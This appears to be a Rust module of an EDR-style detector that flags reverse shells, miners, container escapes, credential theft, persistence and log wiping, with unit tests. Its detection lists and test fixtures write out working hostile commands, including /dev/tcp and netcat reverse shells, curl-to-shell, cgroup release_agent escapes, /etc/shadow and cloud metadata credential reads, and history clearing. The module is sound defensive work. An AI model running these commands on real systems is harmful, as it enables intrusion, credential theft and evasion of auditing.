//! Behavioral rules over process activity, in the spirit of an EDR
//! storyline: what ran, who started it, and what it did on the network.

use crate::crd::BehaviorRule;
use crate::policy::Severity;

use super::process::Proc;

const SHELLS: [&str; 8] = ["sh", "bash", "dash", "zsh", "ash", "ksh", "busybox", "fish"];
const INTERPRETERS: [&str; 5] = ["python", "perl", "ruby", "php", "node"];
const WEB_RUNTIMES: [&str; 13] = [
    "java", "node", "php-fpm", "php", "nginx", "httpd", "apache2", "tomcat", "ruby", "puma",
    "unicorn", "gunicorn", "uwsgi",
];
const MINERS: [&str; 6] = [
    "xmrig",
    "kdevtmpfsi",
    "kinsing",
    "minerd",
    "cpuminer",
    "xmr-stak",
];
const RECON: [&str; 8] = [
    "nmap", "masscan", "zmap", "nc", "ncat", "netcat", "socat", "tcpdump",
];
const READERS: [&str; 16] = [
    "cat", "head", "tail", "less", "more", "base64", "xxd", "od", "strings", "cp", "grep", "tar",
    "zip", "scp", "rsync", "dd",
];
const WRITERS: [&str; 4] = ["cp", "mv", "install", "ln"];
const ERASERS: [&str; 4] = ["rm", "shred", "truncate", "unlink"];
const WRITABLE: [&str; 4] = ["/tmp/", "/dev/shm/", "/var/tmp/", "/run/shm/"];
const NETCATS: [&str; 3] = ["nc", "ncat", "netcat"];
const REVERSE_SHELL_CODE: [&str; 5] = [
    "pty.spawn",
    "dup2(",
    "fsockopen(",
    "tcpsocket.",
    "use socket",
];
const ESCAPE_PATHS: [&str; 6] = [
    "release_agent",
    "notify_on_release",
    "/proc/sys/kernel/core_pattern",
    "/proc/sys/kernel/modprobe",
    "/sys/kernel/uevent_helper",
    "/proc/sysrq-trigger",
];
const RUNTIME_SOCKETS: [&str; 4] = [
    "docker.sock",
    "containerd.sock",
    "crio.sock",
    "cri-dockerd.sock",
];
const RUNTIME_CLIS: [&str; 3] = ["ctr", "crictl", "nerdctl"];
const CREDENTIAL_FILES: [&str; 12] = [
    "/etc/shadow",
    "/etc/gshadow",
    "/etc/kubernetes/admin.conf",
    "/etc/kubernetes/super-admin.conf",
    "/etc/kubernetes/kubelet.conf",
    "/etc/kubernetes/pki/",
    "/var/lib/kubelet/kubeconfig",
    "/var/lib/kubelet/pki/",
    ".aws/credentials",
    ".kube/config",
    ".docker/config.json",
    ".ssh/id_",
];
const METADATA_CREDENTIALS: [&str; 4] = [
    "/latest/meta-data/iam/security-credentials",
    "169.254.170.2",
    "/computemetadata/v1/instance/service-accounts",
    "/metadata/identity/oauth2/token",
];
const ATTACK_TOOLS: [&str; 12] = [
    "pspy",
    "pspy32",
    "pspy64",
    "deepce",
    "cdk",
    "peirates",
    "botb",
    "traitor",
    "mimipenguin",
    "amicontained",
    "kdigger",
    "frpc",
];
const ATTACK_SCRIPTS: [&str; 8] = [
    "linpeas",
    "linenum",
    "linux-exploit-suggester",
    "linux-smart-enumeration",
    "lse.sh",
    "les.sh",
    "deepce",
    "mimipenguin",
];
const PERSISTENCE_PATHS: [&str; 13] = [
    "/etc/cron",
    "/var/spool/cron",
    "/etc/systemd/system/",
    "/lib/systemd/system/",
    "/usr/lib/systemd/system/",
    "/etc/init.d/",
    "/etc/rc.local",
    "/etc/profile",
    "/etc/ld.so.preload",
    ".ssh/authorized_keys",
    ".bashrc",
    ".bash_profile",
    ".profile",
];
const HISTORY_EVASION: [&str; 5] = [
    "history -c",
    "unset histfile",
    "histfile=/dev/null",
    "histsize=0",
    "set +o history",
];
const AUDIT_LOGS: [&str; 9] = [
    "/var/log/auth.log",
    "/var/log/secure",
    "/var/log/wtmp",
    "/var/log/btmp",
    "/var/log/lastlog",
    "/var/log/messages",
    "/var/log/syslog",
    "/var/log/audit/",
    ".bash_history",
];
const SECURITY_UNITS: [&str; 8] = [
    "auditd",
    "falco",
    "apparmor",
    "ward",
    "wazuh-agent",
    "osqueryd",
    "sysdig",
    "tetragon",
];

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Hit {
    pub rule: BehaviorRule,
    pub severity: Severity,
    pub description: String,
}

pub const fn severity(rule: BehaviorRule) -> Severity {
    match rule {
        BehaviorRule::ReverseShell | BehaviorRule::CryptoMiner | BehaviorRule::ContainerEscape => {
            Severity::Critical
        }
        BehaviorRule::WebserverShell
        | BehaviorRule::ReconTool
        | BehaviorRule::SaTokenRead
        | BehaviorRule::RuntimeSocket
        | BehaviorRule::Persistence
        | BehaviorRule::DefenseEvasion => Severity::Medium,
        BehaviorRule::ShellNetworkConnect
        | BehaviorRule::FilelessExec
        | BehaviorRule::ExecFromTmp
        | BehaviorRule::PipeToShell
        | BehaviorRule::KernelModuleLoad
        | BehaviorRule::CredentialAccess
        | BehaviorRule::AttackTool => Severity::High,
    }
}

const fn hit(rule: BehaviorRule, description: String) -> Hit {
    Hit {
        rule,
        severity: severity(rule),
        description,
    }
}

fn is_shell(p: &Proc) -> bool {
    SHELLS.contains(&p.name()) || SHELLS.contains(&p.comm.as_str())
}

fn is_named(p: &Proc, names: &[&str]) -> bool {
    names.contains(&p.name()) || names.contains(&p.comm.as_str())
}

fn is_interpreter(p: &Proc) -> bool {
    INTERPRETERS.iter().any(|i| p.name().starts_with(i))
}

fn args(cmd: &str) -> impl Iterator<Item = &str> {
    cmd.split_whitespace().skip(1)
}

fn operands(cmd: &str) -> impl Iterator<Item = &str> {
    args(cmd).filter(|a| !a.starts_with('-'))
}

fn mentions<'a>(token: &'a str, paths: &[&str]) -> Option<&'a str> {
    paths.iter().any(|p| token.contains(p)).then_some(token)
}

/// The path a process writes when it matches `paths`: a shell redirect, a
/// `tee` operand, or the destination of `cp`, `mv`, `install`, or `ln`.
fn writes_to<'a>(p: &Proc, cmd: &'a str, paths: &[&str]) -> Option<&'a str> {
    if is_shell(p) {
        return cmd
            .split('>')
            .skip(1)
            .filter_map(|s| s.split_whitespace().next())
            .find_map(|t| mentions(t, paths));
    }
    if is_named(p, &["tee"]) {
        return operands(cmd).find_map(|t| mentions(t, paths));
    }
    if is_named(p, &WRITERS) {
        return operands(cmd).last().and_then(|t| mentions(t, paths));
    }
    None
}

fn reverse_shell_command(p: &Proc, cmd: &str) -> Option<&'static str> {
    let dev_net = cmd.contains("/dev/tcp/") || cmd.contains("/dev/udp/");
    if is_shell(p) && dev_net && (cmd.contains("0>&1") || cmd.contains(" -i")) {
        return Some("interactive shell redirected to /dev/tcp");
    }
    if is_named(p, &NETCATS)
        && args(cmd).any(|a| matches!(a, "-e" | "--exec" | "--sh-exec") || a.starts_with("-e/"))
    {
        return Some("netcat executes a program on its connection");
    }
    if is_named(p, &["socat"])
        && cmd.contains("tcp")
        && (cmd.contains("exec:") || cmd.contains("system:"))
    {
        return Some("socat executes a program on its connection");
    }
    if cmd.contains("mkfifo")
        && ["nc ", "ncat ", "telnet ", "openssl s_client"]
            .iter()
            .any(|t| cmd.contains(t))
    {
        return Some("named pipe wires a shell to a network client");
    }
    if is_interpreter(p)
        && (REVERSE_SHELL_CODE.iter().any(|c| cmd.contains(c))
            || (cmd.contains("child_process") && cmd.contains("net.socket")))
    {
        return Some("interpreter one-liner binds a shell to a socket");
    }
    None
}

fn container_escape(p: &Proc, cmd: &str) -> Option<String> {
    if is_named(p, &["nsenter"]) {
        let mut prev = "";
        for a in args(cmd) {
            let host = matches!(a, "-t1" | "--target=1")
                || (matches!(prev, "-t" | "--target") && a == "1")
                || a.contains("/proc/1/ns/");
            if host {
                return Some("nsenter joins the namespaces of host PID 1".into());
            }
            prev = a;
        }
    }
    writes_to(p, cmd, &ESCAPE_PATHS).map(|t| format!("writes a host kernel hook: {t}"))
}

fn kernel_module_load(p: &Proc, cmd: &str) -> bool {
    is_named(p, &["insmod"])
        || (is_named(p, &["modprobe", "kmod"])
            && operands(cmd).any(|a| {
                std::path::Path::new(a)
                    .extension()
                    .is_some_and(|e| e.eq_ignore_ascii_case("ko"))
            }))
}

fn credential_access(p: &Proc, cmd: &str) -> Option<String> {
    if is_named(p, &READERS)
        && let Some(f) = operands(cmd).find_map(|t| mentions(t, &CREDENTIAL_FILES))
    {
        return Some(format!("reads credentials: {f}"));
    }
    if !is_shell(p) && METADATA_CREDENTIALS.iter().any(|m| cmd.contains(m)) {
        return Some("requests cloud credentials from the instance metadata service".into());
    }
    None
}

fn attack_tool(p: &Proc, cmd: &str) -> Option<String> {
    if is_named(p, &ATTACK_TOOLS) {
        return Some(format!("offensive tool started: {}", p.name()));
    }
    if !(is_shell(p) || is_interpreter(p)) {
        return None;
    }
    args(cmd)
        .filter_map(|a| a.rsplit('/').next())
        .find(|b| ATTACK_SCRIPTS.iter().any(|s| b.starts_with(s)))
        .map(|b| format!("offensive script run: {b}"))
}

fn persistence(p: &Proc, cmd: &str) -> Option<String> {
    if is_named(p, &["crontab"]) && !args(cmd).any(|a| a == "-l") {
        return Some("installs a crontab".into());
    }
    writes_to(p, cmd, &PERSISTENCE_PATHS).map(|t| format!("writes an autostart location: {t}"))
}

fn defense_evasion(p: &Proc, cmd: &str, raw: &str) -> Option<String> {
    if is_shell(p) && HISTORY_EVASION.iter().any(|h| cmd.contains(h)) {
        return Some("turns off or clears shell history".into());
    }
    if let Some(t) = writes_to(p, cmd, &AUDIT_LOGS) {
        return Some(format!("overwrites an audit log: {t}"));
    }
    if is_named(p, &ERASERS)
        && let Some(t) = operands(cmd).find_map(|t| mentions(t, &AUDIT_LOGS))
    {
        return Some(format!("erases an audit log: {t}"));
    }
    if is_named(p, &["setenforce"]) && args(cmd).any(|a| a == "0" || a == "permissive") {
        return Some("switches SELinux to permissive".into());
    }
    if is_named(p, &["auditctl"]) && (args(raw).any(|a| a == "-D") || raw.contains("-e 0")) {
        return Some("removes audit rules or turns auditing off".into());
    }
    let stops = args(cmd).any(|a| matches!(a, "stop" | "disable" | "mask" | "kill"));
    if is_named(p, &["systemctl", "service"]) && stops {
        let unit = args(cmd)
            .map(|a| a.trim_end_matches(".service"))
            .find(|a| SECURITY_UNITS.contains(a));
        if let Some(u) = unit {
            return Some(format!("stops security service {u}"));
        }
    }
    None
}

/// Rules for what an attacker does after the first foothold: escape,
/// credentials, tooling, persistence, and covering tracks.
fn post_exploitation(p: &Proc, cmd: &str) -> Vec<Hit> {
    let name = p.name();
    let in_container = p.container_id.is_some();
    let mut hits = Vec::new();
    if in_container && let Some(d) = container_escape(p, cmd) {
        hits.push(hit(BehaviorRule::ContainerEscape, d));
    }
    if in_container && kernel_module_load(p, cmd) {
        hits.push(hit(
            BehaviorRule::KernelModuleLoad,
            format!("{name} loads a kernel module from a container"),
        ));
    }
    if in_container
        && !is_shell(p)
        && (is_named(p, &RUNTIME_CLIS) || RUNTIME_SOCKETS.iter().any(|s| cmd.contains(s)))
    {
        hits.push(hit(
            BehaviorRule::RuntimeSocket,
            format!("{name} talks to the container runtime"),
        ));
    }
    if let Some(d) = credential_access(p, cmd) {
        hits.push(hit(BehaviorRule::CredentialAccess, d));
    }
    if let Some(d) = attack_tool(p, cmd) {
        hits.push(hit(BehaviorRule::AttackTool, d));
    }
    if let Some(d) = persistence(p, cmd) {
        hits.push(hit(BehaviorRule::Persistence, d));
    }
    if let Some(d) = defense_evasion(p, cmd, &p.cmdline) {
        hits.push(hit(BehaviorRule::DefenseEvasion, d));
    }
    hits
}

/// Rules evaluated when a process starts.
pub fn on_exec(
    p: &Proc,
    parent: Option<&Proc>,
    stdio_socket: bool,
    disabled: &[BehaviorRule],
) -> Vec<Hit> {
    let mut hits = Vec::new();
    let exe = p.exe.as_deref().unwrap_or_default();
    let cmd = p.cmdline.to_ascii_lowercase();
    let name = p.name();

    if is_shell(p) && stdio_socket {
        hits.push(hit(
            BehaviorRule::ReverseShell,
            format!("{name} has a socket on stdin or stdout"),
        ));
    } else if let Some(d) = reverse_shell_command(p, &cmd) {
        hits.push(hit(BehaviorRule::ReverseShell, d.into()));
    }
    if exe.starts_with("/memfd:") || exe.ends_with(" (deleted)") || exe.starts_with("/dev/fd/") {
        hits.push(hit(
            BehaviorRule::FilelessExec,
            format!("executable is not on disk: {exe}"),
        ));
    }
    if WRITABLE.iter().any(|w| exe.starts_with(w)) {
        hits.push(hit(
            BehaviorRule::ExecFromTmp,
            format!("executable runs from a world-writable directory: {exe}"),
        ));
    }
    if MINERS.contains(&name)
        || cmd.contains("stratum+tcp")
        || cmd.contains("stratum+ssl")
        || cmd.contains("--donate-level")
    {
        hits.push(hit(
            BehaviorRule::CryptoMiner,
            format!("cryptocurrency miner: {name}"),
        ));
    }
    if let Some(parent) = parent
        && is_shell(p)
        && WEB_RUNTIMES.contains(&parent.name())
    {
        hits.push(hit(
            BehaviorRule::WebserverShell,
            format!("{} spawned {name}", parent.name()),
        ));
    }
    let fetch = cmd.contains("curl ") || cmd.contains("wget ");
    let decode = cmd.contains("base64 -d") || cmd.contains("base64 --decode");
    let pipe = ["| sh", "|sh", "| bash", "|bash"]
        .iter()
        .any(|s| cmd.contains(s));
    if (fetch || decode) && pipe {
        let what = if fetch {
            "downloads a script"
        } else {
            "decodes a payload"
        };
        hits.push(hit(
            BehaviorRule::PipeToShell,
            format!("{what} and pipes it into a shell"),
        ));
    }
    if RECON.contains(&name) {
        hits.push(hit(
            BehaviorRule::ReconTool,
            format!("network tool started: {name}"),
        ));
    }
    if READERS.contains(&name) && cmd.contains("serviceaccount/token") {
        hits.push(hit(
            BehaviorRule::SaTokenRead,
            "reads a Kubernetes service account token".into(),
        ));
    }
    hits.extend(post_exploitation(p, &cmd));
    hits.retain(|h| !disabled.contains(&h.rule));
    hits
}

/// Rules evaluated on an outbound TCP connection.
pub fn on_connect(
    p: &Proc,
    stdio_socket: bool,
    target: &str,
    disabled: &[BehaviorRule],
) -> Vec<Hit> {
    let mut hits = Vec::new();
    if is_shell(p) {
        let rule = if stdio_socket {
            BehaviorRule::ReverseShell
        } else {
            BehaviorRule::ShellNetworkConnect
        };
        hits.push(hit(rule, format!("{} connected to {target}", p.name())));
    }
    hits.retain(|h| !disabled.contains(&h.rule));
    hits
}

#[cfg(test)]
mod tests {
    use super::*;

    fn p(comm: &str, exe: &str, cmd: &str) -> Proc {
        Proc {
            pid: 2,
            ppid: 1,
            comm: comm.into(),
            exe: Some(exe.into()),
            cmdline: cmd.into(),
            ..Proc::default()
        }
    }

    fn c(comm: &str, exe: &str, cmd: &str) -> Proc {
        Proc {
            container_id: Some("abc".into()),
            ..p(comm, exe, cmd)
        }
    }

    fn rules(h: &[Hit]) -> Vec<BehaviorRule> {
        h.iter().map(|h| h.rule).collect()
    }

    fn fired(proc: &Proc) -> Vec<BehaviorRule> {
        rules(&on_exec(proc, None, false, &[]))
    }

    #[test]
    fn every_exec_rule_fires() {
        use BehaviorRule as R;
        assert_eq!(
            rules(&on_exec(
                &p("bash", "/bin/bash", "bash -i"),
                None,
                true,
                &[]
            )),
            vec![R::ReverseShell]
        );
        assert_eq!(
            rules(&on_exec(
                &p("x", "/memfd:x (deleted)", "x"),
                None,
                false,
                &[]
            )),
            vec![R::FilelessExec]
        );
        assert_eq!(
            rules(&on_exec(&p("x", "/tmp/x", "x"), None, false, &[])),
            vec![R::ExecFromTmp]
        );
        assert_eq!(
            rules(&on_exec(
                &p("a", "/usr/bin/a", "a -o stratum+tcp://pool:3333"),
                None,
                false,
                &[]
            )),
            vec![R::CryptoMiner]
        );
        let java = p("java", "/usr/bin/java", "java -jar app.jar");
        assert_eq!(
            rules(&on_exec(
                &p("sh", "/bin/sh", "sh -c id"),
                Some(&java),
                false,
                &[]
            )),
            vec![R::WebserverShell]
        );
        assert_eq!(
            rules(&on_exec(
                &p("sh", "/bin/sh", "sh -c curl http://x | sh"),
                None,
                false,
                &[]
            )),
            vec![R::PipeToShell]
        );
        assert_eq!(
            rules(&on_exec(
                &p("nmap", "/usr/bin/nmap", "nmap 10.0.0.0/16"),
                None,
                false,
                &[]
            )),
            vec![R::ReconTool]
        );
        assert_eq!(
            rules(&on_exec(
                &p(
                    "cat",
                    "/bin/cat",
                    "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
                ),
                None,
                false,
                &[]
            )),
            vec![R::SaTokenRead]
        );
        assert!(on_exec(&p("ls", "/bin/ls", "ls -l"), None, false, &[]).is_empty());
        assert!(
            on_exec(
                &p("bash", "/bin/bash", "bash"),
                None,
                true,
                &[R::ReverseShell]
            )
            .is_empty()
        );
    }

    #[test]
    fn reverse_shell_commands() {
        use BehaviorRule as R;
        for proc in [
            p(
                "bash",
                "/bin/bash",
                "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            ),
            p(
                "python3",
                "/usr/bin/python3.12",
                "python3 -c import socket,os,pty;s=socket.socket();os.dup2(s.fileno(),0);pty.spawn('sh')",
            ),
            p(
                "perl",
                "/usr/bin/perl",
                "perl -e use Socket;socket(S,PF_INET,SOCK_STREAM,0)",
            ),
            p(
                "php",
                "/usr/bin/php",
                "php -r $s=fsockopen('10.0.0.1',4444);",
            ),
            p(
                "sh",
                "/bin/sh",
                "sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
            ),
        ] {
            assert_eq!(fired(&proc), vec![R::ReverseShell], "{}", proc.cmdline);
        }
        for proc in [
            p("nc", "/usr/bin/nc", "nc -e /bin/sh 10.0.0.1 4444"),
            p(
                "socat",
                "/usr/bin/socat",
                "socat TCP:10.0.0.1:4444 EXEC:/bin/sh",
            ),
        ] {
            assert_eq!(fired(&proc), vec![R::ReverseShell, R::ReconTool]);
        }
        assert_eq!(
            on_exec(
                &p(
                    "bash",
                    "/bin/bash",
                    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
                ),
                None,
                true,
                &[]
            )
            .len(),
            1
        );
        for benign in [
            p("bash", "/bin/bash", "bash -c </dev/tcp/127.0.0.1/5432"),
            p(
                "bash",
                "/bin/bash",
                "bash -c exec 3<>/dev/tcp/localhost/80 && cat <&3",
            ),
            p("python3", "/usr/bin/python3", "python3 -m http.server"),
            p("ncat", "/usr/bin/ncat", "ncat -l 8080"),
        ] {
            assert!(
                !fired(&benign).contains(&R::ReverseShell),
                "{}",
                benign.cmdline
            );
        }
    }

    #[test]
    fn decoded_payload_into_shell() {
        let hits = on_exec(
            &p("sh", "/bin/sh", "sh -c echo aWQ= | base64 -d | sh"),
            None,
            false,
            &[],
        );
        assert_eq!(rules(&hits), vec![BehaviorRule::PipeToShell]);
        assert!(hits[0].description.starts_with("decodes"));
    }

    #[test]
    fn container_escape() {
        use BehaviorRule as R;
        for proc in [
            c(
                "nsenter",
                "/usr/bin/nsenter",
                "nsenter -t 1 -m -u -i -n -p -- bash",
            ),
            c(
                "nsenter",
                "/usr/bin/nsenter",
                "nsenter --target=1 --mount sh",
            ),
            c(
                "nsenter",
                "/usr/bin/nsenter",
                "nsenter -m/proc/1/ns/mnt -- systemctl reboot",
            ),
            c("sh", "/bin/sh", "sh -c echo /cmd > /tmp/cgrp/release_agent"),
            c(
                "sh",
                "/bin/sh",
                "sh -c echo 1>/tmp/cgrp/x/notify_on_release",
            ),
            c("tee", "/usr/bin/tee", "tee /proc/sys/kernel/core_pattern"),
        ] {
            assert_eq!(fired(&proc), vec![R::ContainerEscape], "{}", proc.cmdline);
        }
        assert!(fired(&p("nsenter", "/usr/bin/nsenter", "nsenter -t 1 -m sh")).is_empty());
        assert!(fired(&c("nsenter", "/usr/bin/nsenter", "nsenter -t 12 -n ip a")).is_empty());
        assert!(fired(&c("cat", "/bin/cat", "cat /proc/sys/kernel/core_pattern")).is_empty());
    }

    #[test]
    fn kernel_modules_and_runtime_sockets() {
        use BehaviorRule as R;
        assert_eq!(
            fired(&c("insmod", "/sbin/insmod", "insmod /tmp/rk.ko")),
            vec![R::KernelModuleLoad]
        );
        assert_eq!(
            fired(&c("modprobe", "/sbin/modprobe", "modprobe -f /root/rk.ko")),
            vec![R::KernelModuleLoad]
        );
        assert!(fired(&c("modprobe", "/sbin/modprobe", "modprobe ip_vs")).is_empty());
        assert!(fired(&p("insmod", "/sbin/insmod", "insmod nvidia.ko")).is_empty());
        assert_eq!(
            fired(&c(
                "curl",
                "/usr/bin/curl",
                "curl --unix-socket /var/run/docker.sock http://x/containers/json"
            )),
            vec![R::RuntimeSocket]
        );
        assert_eq!(
            fired(&c("crictl", "/usr/bin/crictl", "crictl ps")),
            vec![R::RuntimeSocket]
        );
        assert!(
            fired(&c(
                "sh",
                "/bin/sh",
                "sh -c curl --unix-socket /run/containerd/containerd.sock x"
            ))
            .is_empty()
        );
        assert!(fired(&p("crictl", "/usr/bin/crictl", "crictl ps")).is_empty());
    }

    #[test]
    fn credential_access() {
        use BehaviorRule as R;
        for proc in [
            p("cat", "/bin/cat", "cat /etc/shadow"),
            p("cp", "/bin/cp", "cp /etc/kubernetes/admin.conf /tmp/a"),
            p(
                "tar",
                "/bin/tar",
                "tar czf /tmp/k.tgz /var/lib/kubelet/pki/",
            ),
            p("base64", "/usr/bin/base64", "base64 /root/.aws/credentials"),
            p(
                "curl",
                "/usr/bin/curl",
                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/node",
            ),
            p(
                "wget",
                "/usr/bin/wget",
                "wget -qO- http://169.254.170.23/v1/credentials",
            ),
        ] {
            assert_eq!(fired(&proc), vec![R::CredentialAccess], "{}", proc.cmdline);
        }
        for benign in [
            p(
                "kubelet",
                "/usr/bin/kubelet",
                "kubelet --kubeconfig=/var/lib/kubelet/kubeconfig --cert-dir=/var/lib/kubelet/pki",
            ),
            p(
                "sh",
                "/bin/sh",
                "sh -c curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ),
            p(
                "curl",
                "/usr/bin/curl",
                "curl http://169.254.169.254/latest/meta-data/instance-id",
            ),
        ] {
            assert!(fired(&benign).is_empty(), "{}", benign.cmdline);
        }
    }

    #[test]
    fn attack_tools() {
        use BehaviorRule as R;
        assert_eq!(
            fired(&p("pspy64", "/dev/shm/pspy64", "pspy64")),
            vec![R::ExecFromTmp, R::AttackTool]
        );
        assert_eq!(
            fired(&p("cdk", "/usr/local/bin/cdk", "cdk evaluate")),
            vec![R::AttackTool]
        );
        assert_eq!(
            fired(&p("sh", "/bin/sh", "/bin/sh ./linpeas.sh -a")),
            vec![R::AttackTool]
        );
        assert!(
            fired(&p(
                "curl",
                "/usr/bin/curl",
                "curl -sL https://example.com/linpeas.sh"
            ))
            .is_empty()
        );
    }

    #[test]
    fn persistence() {
        use BehaviorRule as R;
        for proc in [
            p(
                "sh",
                "/bin/sh",
                "sh -c echo ssh-ed25519 AAAA >> /root/.ssh/authorized_keys",
            ),
            p(
                "bash",
                "/bin/bash",
                "bash -c echo /lib/x.so >/etc/ld.so.preload",
            ),
            p("cp", "/bin/cp", "cp /tmp/x /etc/cron.d/x"),
            p("tee", "/usr/bin/tee", "tee -a /etc/crontab"),
            p(
                "mv",
                "/bin/mv",
                "mv /tmp/x.service /etc/systemd/system/x.service",
            ),
            p("crontab", "/usr/bin/crontab", "crontab /tmp/c"),
        ] {
            assert_eq!(fired(&proc), vec![R::Persistence], "{}", proc.cmdline);
        }
        for benign in [
            p("crontab", "/usr/bin/crontab", "crontab -l"),
            p("cp", "/bin/cp", "cp /etc/crontab /tmp/backup"),
            p("sh", "/bin/sh", "sh -c cp /tmp/x /etc/cron.d/x"),
            p("sh", "/bin/sh", "sh -c run 2>&1 >> /var/log/app.log"),
        ] {
            assert!(fired(&benign).is_empty(), "{}", benign.cmdline);
        }
    }

    #[test]
    fn defense_evasion() {
        use BehaviorRule as R;
        for proc in [
            p("bash", "/bin/bash", "bash -c history -c"),
            p("sh", "/bin/sh", "sh -c unset HISTFILE; id"),
            p("sh", "/bin/sh", "sh -c cat /dev/null > /var/log/auth.log"),
            p("rm", "/bin/rm", "rm -f /root/.bash_history"),
            p("shred", "/usr/bin/shred", "shred -u /var/log/wtmp"),
            p("ln", "/bin/ln", "ln -sf /dev/null /root/.bash_history"),
            p("setenforce", "/usr/sbin/setenforce", "setenforce 0"),
            p("auditctl", "/sbin/auditctl", "auditctl -D"),
            p("auditctl", "/sbin/auditctl", "auditctl -e 0"),
            p(
                "systemctl",
                "/bin/systemctl",
                "systemctl stop falco.service",
            ),
            p("service", "/usr/sbin/service", "service auditd stop"),
        ] {
            assert_eq!(fired(&proc), vec![R::DefenseEvasion], "{}", proc.cmdline);
        }
        for benign in [
            p(
                "auditctl",
                "/sbin/auditctl",
                "auditctl -d always,exit -F path=/x",
            ),
            p("systemctl", "/bin/systemctl", "systemctl status auditd"),
            p("systemctl", "/bin/systemctl", "systemctl stop forward"),
            p("rm", "/bin/rm", "rm /var/log/app/old.log"),
        ] {
            assert!(fired(&benign).is_empty(), "{}", benign.cmdline);
        }
    }

    #[test]
    fn connect_rules() {
        let sh = p("bash", "/bin/bash", "bash");
        assert_eq!(
            rules(&on_connect(&sh, false, "10.0.0.1:4444", &[])),
            vec![BehaviorRule::ShellNetworkConnect]
        );
        let hits = on_connect(&sh, true, "10.0.0.1:4444", &[]);
        assert_eq!(rules(&hits), vec![BehaviorRule::ReverseShell]);
        assert_eq!(hits[0].severity, Severity::Critical);
        assert!(on_connect(&p("curl", "/usr/bin/curl", "curl"), false, "x", &[]).is_empty());
    }

    #[test]
    fn severities() {
        for r in BehaviorRule::ALL {
            let _ = severity(r);
        }
        assert_eq!(severity(BehaviorRule::ReconTool), Severity::Medium);
        assert_eq!(severity(BehaviorRule::ExecFromTmp), Severity::High);
        assert_eq!(severity(BehaviorRule::ContainerEscape), Severity::Critical);
        assert_eq!(severity(BehaviorRule::Persistence), Severity::Medium);
    }
}
